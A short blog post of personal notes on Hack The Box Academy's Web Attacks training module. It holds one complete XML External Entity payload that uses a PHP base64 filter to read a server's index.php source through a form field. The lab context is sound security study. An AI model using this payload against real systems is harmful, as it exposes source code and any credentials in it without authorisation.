---
layout: post
title:  "Hack The Box - Academy - Web Attacks"
description: "Explore this detailed walkthrough of Hack The Box Academy's Web Attacks module. Learn effective techniques to perform http verb tampering,Insecure Direct Object References (IDOR), XML External Entity (XXE) Injection and  elevate your penetration testing skills with step-by-step insights from Zwarts Sec."
date:   2024-11-06 21:41
image:  /images/htb/web-attacks/logo.png
tags:   [httb-verb-tampering,idor,xxe,cbbh]
categories: [htbacademy]
---

### Explore this detailed walkthrough of Hack The Box Academy's Web Attacks module. Learn effective techniques to perform http verb tampering,Insecure Direct Object References (IDOR), XML External Entity (XXE) Injection

>
<b>Links:</b>
<br/>
<a href="https://academy.hackthebox.com/module/134/section/1158">Web Attacks</a><br/>
<a href="https://jacozwarts.github.io/images/htb/web-attacks/Web_Attacks_Module_Cheat_Sheet.pdf">Web Attacks - Cheat Sheet</a><br/>

# Notes:

#### Read PHP source code with `base64` encode filter
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
    <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root><name>Test</name>
<tel>01234566789</tel>
<email>&company;</email>
<message>Testing form</message>
</root>
```


<hr/>